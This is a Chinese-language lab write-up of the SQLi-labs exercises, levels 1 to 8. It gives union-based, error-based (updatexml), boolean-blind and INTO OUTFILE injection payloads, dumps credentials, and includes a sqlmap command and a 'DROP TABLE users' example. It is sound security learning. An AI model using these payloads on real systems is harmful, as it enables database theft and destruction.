# **==SQLI-LABS==**



![image-20250227171336038](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227171336038.png)

## **==1. less1: GET Error based Single quotes String==**

第一关判断sql注入是否存在

① 这里提示输出数字作为id的参数，那我们输入：`?id=1`

![image-20250227171358793](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227171358793.png)

![image-20250227171726340](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227171726340.png)

② 通过数字值不同的返回值也不同，所以我们输入的内容是带入到数据库中查询的

![image-20250227171913491](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227171913491.png)

③ 判断sql语句是否是拼接，且是字符型还是数字型

![image-20250227214539103](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227214539103.png)

![image-20250227214628645](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227214628645.png)

④ 可以根据结果指定是字符型（引号 `"` 或者 `'`** 是常见的字符类型值的分隔符。在 SQL 查询中，字符型数据常常需要被包裹在引号中。例如，`WHERE username = 'admin'`。）且存在sql注入漏洞。因为该页面存在回显，所以我们可以使用联合查询。联合查询的原理：联合查询就是两个sql语句一起查询，两张表具有相应的列数，且字段名是一样的。

```
为什么是字符型注入
数字型（如 id=1）查询通常是纯数字，无法通过注入引号来直接破坏查询结构。但字符型数据（如字符串）需要用引号括起来（例如 WHERE username = 'admin'），所以输入 '（引号）就能导致 SQL 查询的结构发生变化，从而造成注入漏洞。
```

⑤ 联合注入

**第一步**：首先知道表格有几列，如果报错就是超过列数，如果显示正常就是没有超出列数

`?id=1' order by 3 --+`

![image-20250227220013628](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227220013628.png)

![image-20250227220031472](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227220031472.png)

**第二步**：爆出显示为4，就是看看表格里面那一列是在页面显示的。可以看到第二列和第三列里面的数据是显示在页面的。

`?id=-1' union select 1,2,3--+`

在 SQL 注入攻击中，`id=-1'union select 1,2,3--+` 这个输入的目的是通过构造特定的 SQL 查询，使得攻击者能够获取数据库的敏感信息，甚至在某些情况下，获取表的结构或数据。

### 1. **`id=-1` 的作用**

- **`id=-1`** 代表查询一个不存在的条目。在正常情况下，`id` 为负数的条目可能在数据库中并不存在。攻击者通过使用一个无效的 `id`（例如 `-1`），可以确保查询的结果是空的，从而为后续的 SQL 注入操作提供一个“干净”的基础。

- 例如，假设数据库查询原本是：

  ```sql
  SELECT * FROM users WHERE id = -1;
  ```

  由于 `id=-1` 的数据通常不存在，查询结果应该为空。然而，攻击者接下来的目标是利用 `UNION` 操作符，将额外的查询结果与原始查询结果结合起来，以便从数据库中读取更多信息。

### 2. **`'` 引号和注释符号 `--+`**

- **`'`**（单引号）用于结束 `id` 参数的值，从而结束 SQL 查询中的条件部分。引号后面的内容被视为新的 SQL 语句。
- **`--+`** 是 SQL 注释符号，意味着后续的部分将被数据库忽略。在这里，`--` 注释掉了查询剩余部分的所有内容（例如，`WHERE` 子句），并允许注入的查询继续执行。

### 3. **`UNION SELECT` 的作用**

- **`UNION SELECT`** 用于联合两个查询的结果。在 SQL 中，`UNION` 允许将两个或多个查询的结果合并到一起返回给用户。攻击者使用 `UNION SELECT` 来将自己的查询结果与原本的查询结果（`SELECT * FROM users WHERE id = -1`）结合。
  - `UNION` 后面的 `SELECT 1, 2, 3` 是一个简单的例子，它选择了数字常量（`1, 2, 3`）。这是为了确保 SQL 查询可以成功执行并返回一些假数据。如果攻击者的目标是获取数据库表中的信息，他们可能会用不同的数字来代替 `1, 2, 3`，这些数字将对应到数据库表的列。

### 4. **具体含义**

- 当攻击者输入 `id=-1'union select 1,2,3--+` 时，SQL 查询会变成：

  ```sql
  SELECT * FROM users WHERE id = -1' UNION SELECT 1, 2, 3 --+;
  ```

  - **`id=-1'`**: 结束了原本查询条件的部分，并开始了新的 SQL 语句。
  - **`UNION SELECT 1, 2, 3`**: 使用 `UNION` 来联合一个新的查询，它选择了数字 `1, 2, 3`。这些数字是为了测试是否能够成功执行 SQL 查询。如果攻击者能够确认返回了 `1, 2, 3`，就说明 SQL 注入成功，并且可以进一步尝试获取数据库中的实际数据。
  - **`--+`**: 注释掉了查询剩余部分，确保数据库不会执行多余的查询条件（例如 `WHERE` 子句），避免报错。

### 5. **`-1` 的特别作用**

- `-1` 是一个常见的技巧，通常用于注入攻击中，以确保查询不会返回任何有效数据。攻击者希望确保原始查询的结果为空（因为 `id=-1` 通常不会存在），这样就能安全地执行注入查询，而不会影响原有的数据返回。
- 然后，通过 `UNION SELECT`，攻击者可以获取其他信息，通常包括数据库的表结构、列数或数据库中的敏感数据。

### 6. **攻击者的目标**

攻击者通常会通过不断修改 `UNION SELECT` 查询中的数字，来确定数据库表的列数。例如，如果数据库的表有 4 列，攻击者可能会尝试以下注入：

```sql
id=-1' UNION SELECT 1, 2, 3, 4 --+;
```

通过这种方法，攻击者可以测试并获取数据库中不同表的信息，比如表的列数、列的类型，甚至是数据库中的实际数据。

![image-20250227220539451](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227220539451.png)

### **为什么是 `2` 和 `3`?**

- 数字 `2` 和 `3`

   可能是数据库中表字段的某些值（例如 

  ```
  login_name
  ```

   和 

  ```
  password
  ```

   字段的某一行数据）。不过，更有可能的是，这些值对应的是某个查询结果中的字段位置。例如，如果攻击者执行了 

  ```
  UNION SELECT
  ```

   查询，将结果中包含了数据库表的某些列：

  - `login_name` 可能是第 2 列。
  - `password` 可能是第 3 列。

如果查询返回的是 `login_name` 和 `password`，然后它们的位置映射到了输出中显示的数字（`2` 和 `3`），这就是攻击者得到的反馈。

**第三步：** 获取当前数据名和版本号，这个就涉及mysql数据库的一些函数，记得就行/通过结果知道当前数据名是security，版本号是5.5.44-0ubuntu0.14.04.1

![image-20250227221051026](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227221051026.png)

**第四步**： 爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到的结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema==字段内容是security==的所有table_name的内容。也就是下面表格user和passwd。

`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+`

![img](https://i-blog.csdnimg.cn/blog_migrate/220248ddd4b1139c6bc723e3eedacb4a.png)

![image-20250227222104897](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227222104897.png)

**第五步**：爆字段名，我们通过sql语句查询知道当前数据库有四个表(emails, referers, uagents, users)，根据表名知道用户的账户和密码是在users表中。接下来我们就是得到该表下的字段名以及内容。

`?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+`

该语句的意思是查询information_schema数据库下的columns表里面且table_users字段内容是users的所有column_name的内容。**注意table_name字段不是只存在columns表中。表示所有字段对应的表名**

![image-20250227224302577](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227224302577.png)

**第六步**：通过上述操作可以得到两个敏感字段就是username和password，接下来我们就要得到该字段对应的内容。我自己加了个id可以隔一下账户和密码。

`?id=-1' union select 1,2,group_concat(username, id, password) from users--+`

![image-20250227224719888](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250227224719888.png)

`Dumb1Dumb,Angelina2I-kill-you,Dummy3p@ssword,secure4crappy,stupid5stupidity,superman6genious,batman7mob!le,admin8admin,admin19admin1,admin210admin2,admin311admin3,dhakkan12dumbo,admin414admin4`

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-1 **Error Based- String**</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">
 
<font size='5' color= '#99FF00'>Your Login name:2<br>Your Password:Dumb1Dumb,Angelina2I-kill-you,Dummy3p@ssword,secure4crappy,stupid5stupidity,superman6genious,batman7mob!le,admin8admin,admin19admin1,admin210admin2,admin311admin3,dhakkan12dumbo,admin414admin4</font></font> </div></br></br></br><center>
<img src="../images/Less-1.jpg" /></center>
</body>
</html>

```



## **==2. less2: GET Error based intiger based==**

```
#和第一关一样进行判断，当我们输入单引号或者双引号可以看到报错，且报错信息看不到数字，所以我们可以猜测sql语句应该是数字型注入。那步骤和第一关是差不多的
?id=1'
?id=1"
```

### 为什么是数字型注入？

1. **报错信息中没有数字：** 如果报错信息不包含数字（例如没有显示 ID、数量等数字字段的相关错误），而只是提到了字符串类型的错误（如引号配对问题），这通常意味着查询语句中大部分字段是数字类型，可能没有正确处理字符串相关的输入。
2. **输入单引号或双引号报错：** 在 SQL 查询中，单引号和双引号通常是用来标识字符串的边界。如果输入这些符号引发错误，可能是因为查询语句预期某个字段为数字，而你却尝试输入字符串，这种错误通常会导致查询的 SQL 语法问题。

![image-20250228105638856](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228105638856.png)

![image-20250228105654318](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228105654318.png)

```
"SELECT * FROM users WHERE id=$id LIMIT 0,1"
"SELECT * FROM users WHERE id=1 ' LIMIT 0,1"出错信息。
 
#注入参数
?id=1 order by 3
?id=-1 union select 1,2,3
?id=-1 union select 1,database(),version()
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'
?id=-1 union select 1,2,group_concat(username ,id , password) from users
 
```

这道题就是要我们识别出字符性注入还是数字型注入，这里可以看到是数字型注入

### 1. **数字型注入（Numeric Injection）**

数字型注入通常发生在查询条件中涉及数字数据类型的字段（如 `INT`、`DECIMAL` 等）。攻击者试图通过向查询中注入数字或者通过修改条件来改变查询的逻辑。

#### 识别方法：

- **输入验证：** 检查是否有涉及数字类型字段的查询。例如，查询语句中可能使用 `WHERE id = 1`、`WHERE price > 100` 等。

- 注入测试：

   尝试在参数中输入数字和一些特殊字符，观察返回结果。

  - 比如：`1 OR 1=1`，这是一种常见的数字型注入 payload，它会使查询总是返回真。
  - 尝试输入 `1; DROP TABLE users`，看看是否会删除表格，如果是数字型注入，应该不会发生错误，且可能会执行 SQL 语句。
  - 如果数字可以被正确接受并执行，通常是数字型注入。

#### 示例：

```sql
SELECT * FROM products WHERE id = 1;
```

注入：

```sql
1 OR 1=1
```

会导致 SQL 语句变成：

```sql
SELECT * FROM products WHERE id = 1 OR 1=1;
```

这会返回所有的记录，因为 `1=1` 始终为真。

### 2. **字符型注入（String Injection）**

字符型注入通常发生在涉及字符串类型字段（如 `VARCHAR`、`TEXT` 等）的查询中。攻击者通常试图通过注入恶意的 SQL 语句片段来修改查询的逻辑，或者绕过身份验证。

#### 识别方法：

- **输入验证：** 检查是否有涉及字符串类型字段的查询。==例如，查询语句中可能使用== `WHERE username = 'admin'` ==或者==`WHERE email = 'user@example.com'`。

- 注入测试：

   **==尝试输入带有单引号、双引号、SQL 关键字的内容，看是否会引发错误。==**

  - 比如：`' OR '1'='1`，这个注入会破坏原本的字符串条件，通常用在登录表单等地方。
  - 尝试输入 `' OR 'x'='x`，如果出现错误，说明可能是字符型注入。
  - 如果输入中的引号被正确地处理或转义，注入可能不会成功；但如果没有适当处理引号，则容易发生字符型注入。

#### 示例：

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
```

注入：

```sql
' OR '1'='1
```

会导致 SQL 语句变成：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password123';
```

这会绕过登录验证，因为 `'1'='1'` 始终为真。

### 区分的方法总结：

- **数字型注入：** 如果参数是数字型字段，尝试注入数字和逻辑表达式，如 `1 OR 1=1` 或 `1; DROP TABLE` 等。
- **字符型注入：** 如果参数是字符串型字段，尝试注入带有单引号或SQL关键字的内容，如 `' OR '1'='1`、`' UNION SELECT` 等。

![image-20250228111835710](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228111835710.png)

## **==3.less3: GET Error based Single quote with twist string==**

![image-20250228111935155](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228111935155.png)

![image-20250228112111704](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228112111704.png)

![image-20250304221312421](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250304221312421.png)

![image-20250304221321636](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250304221321636.png)

```
--+以上面的报错，可以构造下面的代码进行sql注入。后面所有代码以此为基础进行构造

?id=2')--+

?id=1') order by 3--+
?id=-1') union select 1,2,3--+
?id=-1') union select 1,database(),version()--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
```

![image-20250228112536746](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228112536746.png)

![image-20250228112627142](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228112627142.png)

![image-20250228112708406](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250228112708406.png)

## **==4.less4: GET Error based Double Quotes String==**

![image-20250304221519022](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250304221519022.png)

![image-20250304221426670](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250304221426670.png)

根据页面报错得知sql语句是双引号字符型且有括号，通过以下代码进行sql注入

```
?id=1") order by 3--+
?id=-1") union select 1,2,3--+
?id=-1") union select 1,database(),version()--+
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
```



## **==5.less5: GET Double injection Single Quotes String== **

第五关与前面几关都有所不同，我们先传入id=1进去看看

![image-20250304230925414](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250304230925414.png)

第一步：判断注入类型，字符型还是数字型

`?id=1'`

![image-20250304230907423](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250304230907423.png)

`?id=1"`

![image-20250304231011413](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250304231011413.png)

可以看到注入类型为字符型，且为单引号闭合

![image-20250305144959374](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305144959374.png)

这里证实了单引号闭合

第二步：判断字段数

`order by`

![image-20250305145113491](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305145113491.png)

![image-20250305145135107](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305145135107.png)

`order by 3`时页面正常，`order by 4`时页面正常，说明有三个字段

页面有布尔类型状态，所以用布尔盲注，页面没有回显不能用联合查询，页面没有报错信息，不能用报错注入。

![image-20250305145511012](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305145511012.png)

使用length函数来判断数据库名长度是否为1，由图可以看到，因为页面回显异常，所以and length(database())=1这个条件错了。

用这种盲注的方法可以获得数据库长度，数据库名，等信息。推荐用程序化来进行注入，否则人工会很慢。

我们根据页面结果可以看到是字符型的，但是和前面四关还是不一样的，是因为页面虽然有东西。但是对于请求对错出现不一样页面其余的就没有了。这个时候我们用联合查询就没有用了，因为联合查询是需要页面是有回显位的。如果数据不显示只有对错页面显示，我们可以选择布尔盲注。布尔盲注主要用到length(),ascii(),substr()这三个函数，首先通过length()函数确定长度再通过另外两个确定具体字符是什么。布尔盲注对于联合注入来说需要花费大量的时间。

`?id=1' and length(database())=8--+`

![image-20250305145741344](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305145741344.png)

当值为8时，页面回显正常了，说明数据库名长度为8！

现在我们可以使用数据库中的一个函数substr()来取出数据库名的每一位来进行盲注，用来猜数据库名。第一个参数为传入字符串，第二个参数作用时取几位，第三个参数为步长

`?id=1' and substr(database(),1,1)='s'--+`

![image-20250305150126051](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305150126051.png)

页面回显正常，说明数据库的第一位字符是's'，用同样的方法来进行猜测第二个字母，直至猜完八个字符就可以得到完整的数据库名。（以下省略）

`?id=1' and substr(database(),2,1)='e'--+`

![image-20250305150702864](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305150702864.png)

第二个字母是e，最后才出来数据库名是security

`?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 0,1='emails'--+`

`?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 1,1='referers'--+`

`?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 2,1='uagents'--+`

`?id=1' and (select table_name from information_schema.tables where table_schema=database() limit 3,1='users'--+`

然后用同样的方式来注入得到表名：emails、referers、uagents、users

接下来，我们用盲注以下users表的字段有哪些

`?id=1' and (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)='id'--+`

`?id=1' and (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 1,1)='username'--+`

`?id=1' and (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 2,1)='password'--+`

分别有id、username、password三个字段

下一步是利用已知表名，库名、字段名来盲猜表里面的值

`?id=1' and (select username from users where id=1)='dumb'--+`



```
SQL注入——报错注入(Error based)    
	sqlmap会替换或者添加用于引发特定数据库错误的SQL语句到查询参数里面，并通过解析对应的注入结构，判断特定的数据库错误信息是否存在响应的headers/body中。这项技术只有在Web应用配置开启后端DBMS错误信息提醒才有效。     MySQL提供了一个updatexml()函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。    
	updatexml(xml_target,xpath_expr,new_val)    
	xml_target 是要更新的XML列或变量    
	xpath_expr 是要更新的XML节点的路径表达式    
	new_val 是要替换节点值的新值
```

`?id=-1' union select 1,user(),database()--+`

![image-20250305161700220](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305161700220.png)

根据前面的测试，发现联合查询用不了，猜测后台代码逻辑当id正确执行后显示You are in..........，id错误为空时，代码报错显示报错情况。

所以这题可以使用报错注入试试，updatexml()函数+concat()：拼接特殊符号和查询结果

`?id=0' and updatexml(1,concat(1,(select user())),1)--+`

![image-20250305162058934](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305162058934.png)

可以看到这里是成功利用了。

这里也可以使用sqlmap工具进行自动注入

`sudo sqlmap -u http://localhsot/sqli/Less-5/?id=1 --batch --current-user` 

![image-20250305165452183](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305165452183.png)

这里就是我们前面爆出来的

```
?id=1'and length((select database()))>9--+
#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4

?id=1'and ascii(substr((select database()),1,1))=115--+
#substr("78909",1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。
 
 
?id=1'and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13--+
判断所有表名字符长度。
?id=1'and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99--+
逐一判断表名
 
?id=1'and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20--+
判断所有字段名的长度
?id=1'and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99--+
逐一判断字段名。
 
 
?id=1' and length((select group_concat(username,password) from users))>109--+
判断字段内容长度
?id=1' and ascii(substr((select group_concat(username,password) from users),1,1))>50--+
逐一检测内容。
 
 
 
```

## **==6.less6: GET Double injection Double Quotes String== **

```
SQL注入的三个条件
1.参数可控；（从参数输入就知道参数可控）
2.参数过滤不彻底导致恶意代码被执行；（需要在测试过程中判断）
3.参数带入数据库执行。（从网页功能大致分析出是否与数据库进行交互）
	利用order by来测列数
	测显位：mysql用1，2，3，4
	
Mysql获取相关数据
1.数据库版本，看是否符合information_schema查询-version()
2.数据库用户，看是否符合root型注入攻击-user()
3.当前操作系统，看是否支持大小写或文件路径选择-@@version_compile_os
4.数据库名字，为后期猜解指定数据库下的表、列，做准备-database()

```

```
SQL注入——报错注入(Error based)
	sqlmap会替换或者添加用于引发特定数据库错误的SQL语句到查询参数里面，并通过解析对应的注入结构，判断特定的数据库错误信息是否存在响应的headers/body中。这项技术只有在Web应用配置开启后端DBMS错误信息提醒才有效。
	MySQL提供了一个updatexml()函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。
	updatexml(xml_target,xpath_expr,new_val)
	xml_target 是要更新的XML列或变量
	xpath_expr 是要更新的XML节点的路径表达式
	new_val 是要替换节点值的新值
```

这个本质上跟第五关相同都是使用报错注入，这一关使用的是双引号闭合

还是使用updatexml()这个函数

`?id=1" union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+`

![image-20250305165920930](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305165920930.png)

在SQL注入中，`id=1" union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+` 是一个利用 `updatexml` 函数进行错误注入的示例。以下是其含义：

1. **`id=1"`**:
   - 这是原始查询的一部分，假设查询类似于 `SELECT * FROM users WHERE id = 1`。
   - `"` 用于闭合原始查询中的引号，以便注入后续代码。

2. **`union select`**:
   - `UNION` 用于将两个查询的结果合并。
   - `SELECT` 用于选择数据，这里用于注入自定义查询。

3. **`updatexml(1,concat(0x7e,(select user()),0x7e),1)`**:
   - `updatexml` 是XML处理函数，用于更新XML文档。
   
   - `concat(0x7e,(select user()),0x7e)` 将 `~`（0x7e 是 `~` 的十六进制）、当前用户（通过 `select user()` 获取）和另一个 `~` 连接起来。==显示：==`~root@localhost~`

   - 当 `updatexml` 函数因路径格式错误而抛出错误时，错误信息会包含 `concat` 函数的结果。
   
     例如，`concat(0x7e, (select user()), 0x7e)` 会生成类似 `~root~` 的字符串（假设当前用户是 `root`）。
   
     `~` 作为分隔符，可以清晰地标出注入结果（如 `root`）的边界，便于从错误信息中提取。
   
   - 由于 `updatexml` 期望有效的XML路径，而 `concat` 的结果不是有效路径，因此会抛出错误，并在错误信息中包含 `concat` 的结果，从而泄露当前用户信息。

爆库名：

`?id=1" union select updatexml(1,concat(0x7e,(select datebase()),0x7e),1)--+`

![image-20250305170703030](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305170703030.png)

爆表名

`?id=1" union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)--+`

![image-20250305171147282](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305171147282.png)

爆用户名：

`?id=1" union select updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)--+`

![image-20250305171432752](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305171432752.png)

爆密码：

`?id=1" union select updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1)--+`

![image-20250305171644065](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305171644065.png)



## **==7.Less-7 GET Dump into outfile String==**

```
MySQL里面使用select ... into outfile 可以把数据导出到文本文件上，里面有几个参数：
secure_file_priv 可以用来限制导出效果，它有三个属性：null限制不能导出；为空可以自定义；为一个路径则只能导出到指定路径
datadir是MySQL数据存储位置，是默认的相对位置。
查询时候加上@@，如@@secure_file_priv、@@datadir
```

`?id=1`

![image-20250305231437141](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305231437141.png)

`?id=1'`

![image-20250305231459284](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305231459284.png)

![image-20250305231523774](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305231523774.png)

这有几个都是会引发报错，这里为什么不试 `"` ，因为 `"` 一般是括在整个sql语句的，所以我们先根据 `'` 进行尝试，并且我们还可以添加 `)` 尝试

`?id=1')--+`

![image-20250305231838744](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305231838744.png)

`?id=1'))--+`

![image-20250305231902725](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305231902725.png)

可以看到这里需要两个 `)` ，才可以过

`?id=1')) order by 4--+`

![image-20250305232002445](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305232002445.png)

![image-20250305232013774](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305232013774.png)

可以看到这里的字段长度是3

```
SELECT column1 FROM table_name INTO OUTFILE 'file_path'
OUTFILE命令可以将查询结果导出为文本文件,CSV文件等多种格式。
注意：使用这个功能需要提前开启权限。你可以前往MySQL的源文件目录中，
	打开my.ini配置文件，并修改其中的`secure_file_priv='D://'`
	参数设置为你的安全目录。(请设置为C盘以外的磁盘，避免系统权限问题。)
	修改完成并重启后在MySQL命令行中输入`show variables like '%secure%';`查看是否设置成功。

```

`?id=1')) union select database(),version(),user() from dual into outfile '/tmp/1.txt'--+`

`dual` 是一个通用的虚拟表，只是一个占位符，查询结果与 `dual` 表本身无关

![image-20250305232704146](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305232704146.png)

`?id=1')) union select database(),user(),@@datadir into outfile '/tmp/2.txt'--+`

![image-20250305232907789](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305232907789.png)

可以看到这两种方法都可以



## **==8.Less-8 GET Blind Boolian Based Single Quotes==**

`?id=1`

![image-20250305234358745](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234358745.png)

`?id=1 and 1=1`

![image-20250305234444765](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234444765.png)

`?id=1 and 1=2`

![image-20250305234513121](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234513121.png)

以上可以发现这里不存在整型注入

`?id=1'`

![image-20250305234553423](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234553423.png)

![image-20250305234657037](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234657037.png)

没有显示位，可以判断为字符型注入

**爆数据库名**

`?id=1' and length(database())>1--+`

![image-20250305234834958](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234834958.png)

`?id=1' and length(database())>7--+`

![image-20250305234846911](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234846911.png)

`?id=1' and length(database())>8--+`

![image-20250305234910397](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305234910397.png)

可以判断数据库的长度为8

**爆破数据库名**

`?id=1' and ascii(substr((database()),1,1))=115--+`

![image-20250305235135741](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305235135741.png)

可以看到当ascll值为115时回显说明第一个字符为‘s’剩下的字符依次进行解密，当然这样比较麻烦.
第二位：`?id=1' and ascii(substr((database()),2,1)) >80 --+`
类似这样只需修改数值依次解出：database=security
大致可以猜测到数据库名：security

**爆表名**

**判断表的长度**

`?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>3  --+   (结果为4)`

![image-20250305235427505](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305235427505.png)

`?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())>4--+`

![image-20250305235504541](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250305235504541.png)

表的数量为4

**判断第一个表的长度**

`?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>5 --+(结果为5)`

![image-20250306151635784](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306151635784.png)

![image-20250306151650205](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306151650205.png)

**判断表的字符**

`?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>79 --+`

![image-20250306151928589](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306151928589.png)

说明表中的第一个字符的ascii大于79

`?id=1'   and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>116 --+`

![image-20250306153037965](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306153037965.png)

![image-20250306153109438](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306153109438.png)

第一个字母是 `u` 

`?id=1'   and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>115 --+`

![image-20250306153233878](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306153233878.png)

![image-20250306153244620](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306153244620.png)

第二个字母是 `s` ，那合理猜测是`user`，或者`users`

有前面得到第一个表的长度是5，可以得知是 `users`

**获取字段列数**

`?id=1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)=3 --+`

![image-20250306153749146](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306153749146.png)

![image-20250306153802068](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20250306153802068.png)

可得列数是：3

**获取字段列名**

